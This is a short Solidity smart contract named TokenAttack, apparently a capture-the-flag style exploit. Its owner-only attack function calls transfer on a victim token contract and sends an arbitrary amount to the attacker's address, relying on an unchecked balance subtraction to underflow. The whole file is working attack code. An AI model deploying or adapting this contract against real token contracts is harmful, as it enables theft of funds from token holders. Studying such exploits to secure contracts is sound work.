// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface TokenInterface {
    function transfer(address, uint) external returns (bool);
}

contract TokenAttack {

    address payable public attacker;

    modifier onlyAttacker {
        require(msg.sender == attacker, "TokenAttack: NOT_OWNER");
        _;
    }

    constructor() public {
        attacker = payable(msg.sender);
    }

    function attack(address _victim, uint _amount) public onlyAttacker {
        TokenInterface(_victim).transfer(attacker, _amount);
    }
}
